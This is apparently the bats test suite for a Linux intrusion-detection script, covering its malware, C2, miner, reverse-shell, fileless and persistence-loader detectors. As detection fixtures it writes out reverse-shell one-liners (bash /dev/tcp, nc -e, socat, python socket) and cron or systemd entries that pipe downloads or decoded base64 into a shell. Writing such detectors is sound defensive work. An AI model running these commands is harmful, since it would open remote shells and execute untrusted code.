#!/usr/bin/env bats
# lib/detect.sh: each detector, and the HARD/SOFT boundary between them.

setup() {
  load helper
  cerberus_setup
  cerberus_load
}

teardown() {
  reap ${SPAWNED:-}
}

# --- malware_path ----------------------------------------------------------

@test "malware_path: an executable payload at a known path is HARD" {
  local payload="$TEST_TMP/let"
  printf '#!/bin/sh\n' > "$payload"
  chmod 755 "$payload"
  sig malware_paths.txt "$payload"

  run detect_malware_paths
  [ "${#lines[@]}" -eq 1 ]
  [[ "$output" == "HARD|malware_path|-|$payload perms=755" ]]
}

@test "malware_path: an already neutralised payload (000) is not re-reported" {
  local payload="$TEST_TMP/let"
  printf '#!/bin/sh\n' > "$payload"
  chmod 000 "$payload"
  sig malware_paths.txt "$payload"

  run detect_malware_paths
  [ -z "$output" ]
}

@test "malware_path: a path that does not exist produces nothing" {
  sig malware_paths.txt "$TEST_TMP/absent"
  run detect_malware_paths
  [ -z "$output" ]
}

# --- malware_hash ----------------------------------------------------------

@test "malware_hash: a file whose md5 is known is HARD" {
  local payload="$TEST_TMP/dropper"
  printf 'malicious\n' > "$payload"
  chmod 700 "$payload"
  local md5; md5="$(md5sum "$payload" | cut -d' ' -f1)"
  sig malware_md5.txt "$md5"

  # _SUSPECT_DIRS is the scan scope; point it at the sandbox.
  _SUSPECT_DIRS=("$TEST_TMP")
  run detect_malware_hashes
  [[ "$output" == *"HARD|malware_hash|-|$payload md5=$md5"* ]]
}

@test "malware_hash: an unknown hash in the same directory is ignored" {
  printf 'harmless\n' > "$TEST_TMP/ok"
  chmod 700 "$TEST_TMP/ok"
  sig malware_md5.txt "00000000000000000000000000000000"

  _SUSPECT_DIRS=("$TEST_TMP")
  run detect_malware_hashes
  [ -z "$output" ]
}

# --- c2 --------------------------------------------------------------------

@test "c2_beacon: nc to a known C2 address is HARD" {
  sig c2_ips.txt "203.0.113.9"
  sig c2_ports.txt "9009"
  fixture ps_args "  4242 nc 203.0.113.9 9009"

  run detect_c2
  [[ "$output" == *"HARD|c2_beacon|4242|"* ]]
  [[ "$output" == *"-> C2 203.0.113.9"* ]]
}

@test "c2_beacon: nc to a suspicious port on an unknown address is still HARD" {
  sig c2_ips.txt "203.0.113.9"
  sig c2_ports.txt "9009"
  fixture ps_args "  4243 nc 198.51.100.7 9009"

  run detect_c2
  [[ "$output" == *"HARD|c2_beacon|4243|"* ]]
  [[ "$output" == *"suspicious port 9009"* ]]
}

@test "c2_beacon: an ordinary process is not flagged just for naming an IP" {
  sig c2_ips.txt "203.0.113.9"
  sig c2_ports.txt "9009"
  # curl is not nc/ncat/socat: argv matching is restricted on purpose.
  fixture ps_args "  4244 curl https://203.0.113.9/"

  run detect_c2
  [ -z "$output" ]
}

@test "c2_socket: an established socket to a C2 address is HARD whoever opened it" {
  sig c2_ips.txt "203.0.113.9"
  sig c2_ports.txt "9009"
  fixture ps_args ""
  fixture ss_established \
    'ESTAB 0 0 10.0.0.2:44120 203.0.113.9:9009 users:(("python3",pid=8123,fd=5))'

  run detect_c2
  [[ "$output" == *"HARD|c2_socket|8123|"* ]]
  [[ "$output" == *"203.0.113.9"* ]]
}

# --- miner -----------------------------------------------------------------

@test "miner: miner-like argv without CPU load is SOFT, not killed" {
  SPAWNED="$(spawn_idle)"
  sig miner_patterns.txt "xmrig"
  fixture ps_args "  $SPAWNED xmrig --url pool.example:3333"
  fixture ps_cpu  "$SPAWNED xmrig 90.0"

  run detect_miner
  [[ "$output" == "SOFT|miner|$SPAWNED|"* ]]
  [[ "$output" != *"HARD"* ]]
}

@test "miner: miner-like argv on a CPU-hot process is HARD" {
  SPAWNED="$(spawn_busy)"
  sig miner_patterns.txt "xmrig"
  fixture ps_args "  $SPAWNED xmrig --url pool.example:3333"
  fixture ps_cpu  "$SPAWNED xmrig 99.0"
  CPU_THRESHOLD=1     # the process is real, so its /proc stat really does move

  run detect_miner
  [[ "$output" == "HARD|miner|$SPAWNED|"* ]]
}

@test "miner: no miner patterns configured means no findings" {
  : > "$CERBERUS_CONF_DIR/signatures/miner_patterns.txt"
  fixture ps_args "  1 xmrig --url pool.example:3333"
  run detect_miner
  [ -z "$output" ]
}

# --- high_cpu --------------------------------------------------------------

@test "high_cpu: reports only after CPU_SUSTAIN_SAMPLES consecutive passes" {
  SPAWNED="$(spawn_busy)"
  fixture ps_cpu "$SPAWNED burner 99.0"
  fixture ps_p   "burner burner --spin"
  CPU_THRESHOLD=1
  CPU_SUSTAIN_SAMPLES=3

  run detect_high_cpu; [ -z "$output" ]
  run detect_high_cpu; [ -z "$output" ]
  run detect_high_cpu
  [[ "$output" == "SOFT|high_cpu|$SPAWNED|"* ]]

  # and only once -- a sustained hog must not alert every 30 seconds forever
  run detect_high_cpu
  [ -z "$output" ]
}

@test "high_cpu: a whitelisted process is never reported" {
  SPAWNED="$(spawn_busy)"
  printf 'burner\n' > "$CERBERUS_CONF_DIR/whitelist.txt"
  fixture ps_cpu "$SPAWNED burner 99.0"
  CPU_THRESHOLD=1
  CPU_SUSTAIN_SAMPLES=1

  run detect_high_cpu
  [ -z "$output" ]
}

@test "high_cpu: disabled by DETECT_HIGH_CPU=0" {
  SPAWNED="$(spawn_busy)"
  fixture ps_cpu "$SPAWNED burner 99.0"
  CPU_THRESHOLD=1
  CPU_SUSTAIN_SAMPLES=1
  DETECT_HIGH_CPU=0

  run detect_high_cpu
  [ -z "$output" ]
}

# --- new_listener ----------------------------------------------------------

@test "new_listener: a port absent from the baseline is SOFT" {
  printf '22\n' > "$STATE_DIR/baseline/listeners"
  fixture ss_listen 'LISTEN 0 4096 0.0.0.0:22   0.0.0.0:*' \
                    'LISTEN 0 4096 0.0.0.0:4444 0.0.0.0:*'
  fixture ss_listen_pid 'LISTEN 0 4096 0.0.0.0:4444 0.0.0.0:* users:(("nc",pid=99,fd=3))'

  run detect_new_listener
  [[ "$output" == *"SOFT|new_listener|-|new LISTEN port 4444"* ]]
  [[ "$output" != *"port 22"* ]]
}

@test "new_listener: the first run seeds the baseline instead of alerting" {
  rm -f "$STATE_DIR/baseline/listeners"
  fixture ss_listen 'LISTEN 0 4096 0.0.0.0:22 0.0.0.0:*'

  run detect_new_listener
  [ -z "$output" ]
  run cat "$STATE_DIR/baseline/listeners"
  [ "$output" = "22" ]
}

# --- upx -------------------------------------------------------------------

@test "upx_new: a UPX-packed file in a volatile directory is SOFT" {
  local f="$TEST_TMP/packed"
  printf 'ELF junk UPX! more junk\n' > "$f"
  chmod 700 "$f"
  _SUSPECT_DIRS=("$TEST_TMP")

  run detect_upx_new
  [[ "$output" == *"SOFT|upx_new|-|UPX-packed executable: $f"* ]]
}

@test "upx_new: an ordinary executable is not flagged" {
  local f="$TEST_TMP/plain"
  printf '#!/bin/sh\necho hello\n' > "$f"
  chmod 700 "$f"
  _SUSPECT_DIRS=("$TEST_TMP")

  run detect_upx_new
  [ -z "$output" ]
}

@test "high_cpu: the sustain counter does not survive pid reuse" {
  # The counter used to be keyed by pid alone, so a new process landing on a
  # recycled pid inherited the CPU history of the one before it.
  SPAWNED="$(spawn_busy)"
  fixture ps_cpu "$SPAWNED burner 99.0"
  CPU_THRESHOLD=1
  CPU_SUSTAIN_SAMPLES=2

  run detect_high_cpu; [ -z "$output" ]

  # forge the state file as if this pid had been counted under an older
  # incarnation of the process
  local st; st="$(_proc_starttime "$SPAWNED")"
  printf '%s:%s\t99\t0\n' "$SPAWNED" "$(( st + 1 ))" > "$CPU_STATE_FILE"

  run detect_high_cpu
  [ -z "$output" ]     # the stale count belongs to a different process
}

@test "_proc_stat_tail is not confused by a comm containing spaces" {
  # comm is chosen by the process; splitting the raw stat line would let it
  # shift every field after it.
  SPAWNED="$(spawn_busy)"
  run _proc_cpu_jiffies "$SPAWNED"
  [ "$status" -eq 0 ]
  [[ "$output" =~ ^[0-9]+$ ]]
  run _proc_starttime "$SPAWNED"
  [[ "$output" =~ ^[0-9]+$ ]]

  # a synthetic stat line in the shape the kernel produces for a hostile comm
  run bash -c "
    source '$REPO_ROOT/lib/common.sh' >/dev/null 2>&1
    source '$REPO_ROOT/lib/detect.sh'
    line='42 (evil) proc (x) S 1 42 42 0 -1 0 0 0 0 0 111 222 0 0 20 0 1 0 999 0 0'
    printf '%s' \"\${line##*') '}\"
  "
  # state is first after the comm, utime/stime land where the code expects
  [[ "$output" == "S 1 42"* ]]
}

@test "malware_hash: a sha256 signature matches too" {
  local payload="$TEST_TMP/dropper"
  printf 'malicious\n' > "$payload"
  chmod 700 "$payload"
  local sha; sha="$(sha256sum "$payload" | cut -d' ' -f1)"
  sig malware_sha256.txt "$sha"

  _SUSPECT_DIRS=("$TEST_TMP")
  run detect_malware_hashes
  [[ "$output" == *"HARD|malware_hash|-|$payload sha256=$sha"* ]]
}

@test "malware_hash: signature files are matched case-insensitively" {
  local payload="$TEST_TMP/dropper"
  printf 'malicious\n' > "$payload"
  chmod 700 "$payload"
  sig malware_sha256.txt "$(sha256sum "$payload" | cut -d' ' -f1 | tr 'a-f' 'A-F')"

  _SUSPECT_DIRS=("$TEST_TMP")
  run detect_malware_hashes
  [[ "$output" == *"HARD|malware_hash"* ]]
}

@test "malware_hash: with no hash signatures at all nothing is scanned" {
  : > "$CERBERUS_CONF_DIR/signatures/malware_md5.txt"
  printf 'anything\n' > "$TEST_TMP/x"
  chmod 700 "$TEST_TMP/x"
  _SUSPECT_DIRS=("$TEST_TMP")
  run detect_malware_hashes
  [ -z "$output" ]
}

# --- reverse shell ---------------------------------------------------------

@test "revshell: a bash /dev/tcp redirect is SOFT" {
  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
  fixture ps_args '  3001 bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'
  run detect_revshell
  [[ "$output" == "SOFT|revshell|3001|"* ]]
}

@test "revshell: nc with an attached shell is SOFT" {
  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
  fixture ps_args '  3002 nc -e /bin/sh 203.0.113.9 4444'
  run detect_revshell
  [[ "$output" == *"SOFT|revshell|3002"* ]]
}

@test "revshell: socat handing over a shell is SOFT" {
  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
  fixture ps_args '  3003 socat tcp-connect:203.0.113.9:4444 exec:/bin/bash,pty,stderr'
  run detect_revshell
  [[ "$output" == *"SOFT|revshell|3003"* ]]
}

@test "revshell: the python socket one-liner is SOFT" {
  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
  fixture ps_args '  3004 python3 -c import socket,os,pty;s=socket.socket();s.connect(("203.0.113.9",4444));os.dup2(s.fileno(),0)'
  run detect_revshell
  [[ "$output" == *"SOFT|revshell|3004"* ]]
}

@test "revshell: ordinary shells and tools are not reported" {
  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
  fixture ps_args \
    '  3010 bash' \
    '  3011 -bash' \
    '  3012 sshd: root@pts/0' \
    '  3013 nc -l 8080' \
    '  3014 python3 manage.py runserver' \
    '  3015 socat TCP-LISTEN:8080,fork TCP:127.0.0.1:9090' \
    '  3016 curl -sS https://example.com/x.tar.gz' \
    '  3017 /usr/bin/ssh -i /root/.ssh/id_ed25519 backup@example.com'
  run detect_revshell
  [ -z "$output" ]
}

@test "revshell: disabled by DETECT_REVSHELL=0" {
  cp "$REPO_ROOT/etc/signatures/revshell_patterns.txt" "$SIG_DIR/"
  fixture ps_args '  3001 bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'
  DETECT_REVSHELL=0 run detect_revshell
  [ -z "$output" ]
}

@test "revshell: no pattern file means no findings" {
  fixture ps_args '  3001 bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'
  run detect_revshell
  [ -z "$output" ]
}

# --- fileless --------------------------------------------------------------

@test "fileless: a process running from anonymous memory is reported" {
  # A real memfd, not a fixture: the helper execs a script that only ever
  # existed in memory, so /proc/<pid>/exe genuinely reads "/memfd:... (deleted)".
  python3 "$REPO_ROOT/tests/memfd_exec.py" "$TEST_TMP/memfd.pid" </dev/null >/dev/null 2>&1 &
  SPAWNED=$!
  disown "$SPAWNED" 2>/dev/null || true

  local i=0
  while [ ! -s "$TEST_TMP/memfd.pid" ] && [ "$i" -lt 50 ]; do sleep 0.1; i=$(( i + 1 )); done
  local child; child="$(cat "$TEST_TMP/memfd.pid" 2>/dev/null || true)"
  [ -n "$child" ] || skip "kernel or python without memfd_create"

  run detect_proc_exe
  reap "$child"
  [[ "$output" == *"SOFT|fileless|$child|executing from anonymous memory"* ]]
}

@test "fileless: disabled by DETECT_FILELESS=0" {
  DETECT_FILELESS=0 run detect_proc_exe
  [[ "$output" != *"fileless"* ]]
}

# --- loaders in persistence points -----------------------------------------

@test "loader: a cron job that pipes curl into a shell is SOFT" {
  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
  _loader_sources() {
    printf 'root crontab\t%s\n' '*/5 * * * * curl -s http://198.51.100.9/x.sh | sh'
  }
  run detect_loader
  [[ "$output" == *"SOFT|loader|-|downloads and executes code, in root crontab:"* ]]
  [[ "$output" == *"198.51.100.9"* ]]
}

@test "loader: a unit ExecStart that decodes base64 into a shell is SOFT" {
  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
  _loader_sources() {
    printf '/etc/systemd/system/x.service\t%s\n' \
      'ExecStart=/bin/sh -c "echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IHN0cmluZw== | base64 -d | sh"'
  }
  run detect_loader
  [[ "$output" == *"SOFT|loader"* ]]
  [[ "$output" == *"x.service"* ]]
}

@test "loader: ordinary scheduled jobs are not reported" {
  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
  _loader_sources() {
    printf 'root crontab\t%s\n' \
      '0 3 * * * /usr/local/bin/backup.sh' \
      '0 9 * * * /opt/app/master.sh digest 1' \
      '*/10 * * * * curl -sS -o /var/log/feed.json https://example.com/feed.json' \
      '0 4 * * * certbot renew --quiet'
    printf '/etc/systemd/system/app.service\t%s\n' \
      'ExecStart=/usr/bin/node /opt/app/server.js'
  }
  run detect_loader
  [ -z "$output" ]
}

@test "loader: the same entry is reported once, not on every pass" {
  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
  _loader_sources() {
    printf 'root crontab\t%s\n' '*/5 * * * * wget -qO- http://198.51.100.9/x | bash'
  }
  run detect_loader
  [[ "$output" == *"SOFT|loader"* ]]
  run detect_loader
  [ -z "$output" ]
}

@test "loader: respects the persistence cadence and the toggle" {
  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
  _loader_sources() {
    printf 'root crontab\t%s\n' '*/5 * * * * curl -s http://198.51.100.9/x | sh'
  }
  PERSISTENCE_EVERY=10

  CERBERUS_PASS=3 run detect_loader
  [ -z "$output" ]
  DETECT_LOADER=0 CERBERUS_PASS=10 run detect_loader
  [ -z "$output" ]
  CERBERUS_PASS=10 run detect_loader
  [[ "$output" == *"SOFT|loader"* ]]
}

@test "loader: reads real crontab, cron.d and unit files without blowing up" {
  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
  fixture crontab_out "0 3 * * * /usr/local/bin/backup"
  run _loader_sources
  [ "$status" -eq 0 ]
  [[ "$output" == *"root crontab"* ]]
}

@test "dry run: the CPU sustain counter does not advance" {
  SPAWNED="$(spawn_busy)"
  fixture ps_cpu "$SPAWNED burner 99.0"
  CPU_THRESHOLD=1
  CPU_SUSTAIN_SAMPLES=2
  DRY_RUN=1

  run detect_high_cpu
  [ -z "$output" ]
  run detect_high_cpu
  [ -z "$output" ]              # would have fired on the second pass if it persisted
  [ ! -f "$CPU_STATE_FILE" ]
}

@test "dry run: the loader dedupe set is not written" {
  cp "$REPO_ROOT/etc/signatures/loader_patterns.txt" "$SIG_DIR/"
  _loader_sources() {
    printf 'root crontab\t%s\n' '*/5 * * * * curl -s http://198.51.100.9/x | sh'
  }
  DRY_RUN=1

  run detect_loader
  [[ "$output" == *"SOFT|loader"* ]]
  [ ! -f "$LOADER_SEEN_FILE" ]

  run detect_loader
  [[ "$output" == *"SOFT|loader"* ]]     # still reported, nothing was remembered
}

@test "dry run: the listener baseline is not seeded" {
  rm -f "$STATE_DIR/baseline/listeners"
  fixture ss_listen 'LISTEN 0 4096 0.0.0.0:22 0.0.0.0:*'
  DRY_RUN=1

  run detect_new_listener
  [[ "$output" != *"SOFT|new_listener"* ]]
  [ ! -f "$STATE_DIR/baseline/listeners" ]
}
